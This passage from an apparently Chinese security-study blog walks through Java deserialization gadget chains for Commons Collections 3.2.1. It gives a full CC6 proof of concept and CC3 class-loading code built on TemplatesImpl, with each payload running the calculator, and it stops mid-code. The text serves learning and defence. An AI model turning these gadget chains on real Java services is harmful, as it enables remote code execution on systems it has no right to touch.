class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">rc</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(transformedmap,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazyMapClass</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(transformedmap,chainedTransformer);</span><br><span class="line">        transformedmap.remove(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC3链"><a href="#CC3链" class="headerlink" title="CC3链"></a>CC3链</h2><h3 id="前置-1"><a href="#前置-1" class="headerlink" title="前置"></a>前置</h3><p>环境还是之前cc1的环境，jdk8u65，cc3.2.1。</p><p>在前面分析过的cc1和cc6都是直接通过代码Runtime.getRuntime().exec()去执行命令的，而这里的cc3是通过类加载机制加载任意类来达到命令执行的。</p><p>核心是利用TemplatesImpl执行字节码，先要学习一下类加载机制，组长视频和文章反复看就完了。</p><p><a href="https://www.cnblogs.com/caicz/p/12718026.html">https://www.cnblogs.com/caicz/p/12718026.html</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/119082164?spm=1001.2014.3001.5501">https://blog.csdn.net/solitudi/article/details/119082164?spm=1001.2014.3001.5501</a></p><p><a href="https://cloud.tencent.com/developer/article/2287105">https://cloud.tencent.com/developer/article/2287105</a></p><p>在大概了解了类加载机制之后，我们先来编写一个简单的样例代码利用defineClass。</p><p>首先编写恶意类，我这里写了一个exp.java，用于弹出计算器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编写了一个工具类，用于返回编译exp.java之后生成的class文件之后的base64字符串。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenerateClassBase</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String encoded;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getEncodedClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;javac exp.java&quot;</span>);</span><br><span class="line">            process.waitFor();</span><br><span class="line"></span><br><span class="line">            <span class="type">Path</span> <span class="variable">classFile</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;F:\\code\\java\\cc1\\target\\classes\\org\\mashiro\\exp.class&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] classBytes = Files.readAllBytes(classFile);</span><br><span class="line"></span><br><span class="line">            encoded = Base64.getEncoder().encodeToString(classBytes);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> encoded;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再在另一个代码中尝试利用defineClass去加载这个类，并进行实例化去触发无参构造器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> GenerateClassBase.getEncodedClass();</span><br><span class="line">        System.out.println(encoded);</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(encoded);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;org.mashiro.exp&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        c.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行代码即可弹出计算器。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210934398.png" alt="img"></p><p>了解了defineClass的用法之后，我们再去了解如何利用TemplatesImpl去加载。</p><h3 id="TemplatesImpl加载"><a href="#TemplatesImpl加载" class="headerlink" title="TemplatesImpl加载"></a>TemplatesImpl加载</h3><p>核心还是去利用defineClass，我们尝试利用其他的类，是因为在实际场景中，defineClass方法作用域却是不开放的，所以我们很难直接利用到它。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210935625.png" alt="img"></p><p>我们直接跟进去，可以发现在TransletClassLoader类里面用到了defineClass。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个类是一个内部类，我们需要找到哪个方法调用了它。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210935811.png" alt="img"></p><p>找到一个private方法，我们可以来具体看看这个类的作用是干什么的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先检查字节码_bytecodes是否为空，然后创建了一个TransletClassLoader，随后是最关键的一步，<strong>循环加载字节码，使用TransletClassLoader的defineClass方法将字节码定义为类，并且存储在_class数组中</strong>，最后就是一些检查和异常处理了。</p><p>这个类是private，也就意味着我们还需要往后去寻找，这里能够完成定义的操作了。继续跟进。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210936708.png" alt="img"></p><p>可以发现有三个，并且有一个还是public。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">synchronized</span> Class[] getTransletClasses() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="comment">// Falls through</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _class;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getTransletIndex</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="comment">// Falls through</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _transletIndex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">        translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是可以发现在getTransletInstance中，对加载进来的字节码进行了实例化，其实根据名称来看也能够判断他们三个的用法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_class[_transletIndex].newInstance()</span><br></pre></td></tr></table></figure><p>进行了实例化，但还是之前的问题，他是private，我们需要继续找。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210936625.png" alt="img"></p><p>只有一处地方用到了，巧的是它是public。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们整体的调用链就出来了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt; </span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>流程出来了我们还需要保证每一步的正常进行。</p><p>由于基本上是私有属性，我们先来写一个类通过反射去修改私有属性的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">    Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(true);</span><br><span class="line">    field.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看newTransformer。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210936752.png" alt="img"></p><p>没有什么需要设置的，随后到达getTransletInstance。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210936720.png" alt="img"></p><p>只要_name不等于null就行了，不然会return到达不了实例化的地方，接着再看defineTransletClasses。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210936350.png" alt="img"></p><p>首先是_bytecodes不能为null，这里我们肯定会传入字节码的，不用担心这个地方。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210936674.png" alt="img"></p><p>然后需要能够正确的创建出TransletClassLoader，这里就需要我们的_tfactory具有</p><p>getExternalExtensionsMap这个方法，我们跟进去发现是来自一个叫TransformerFactoryImpl的类，我们让_tfactory成为它的子类就行了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210936965.png" alt="img"></p><p>还有一个判断是判断加载类的父类是否为ABSTRACT_TRANSLET(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet)</p><p>理清楚之后我们就可以构造poc了。</p><p>首先来修改一下，我们之前写的exp.java。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    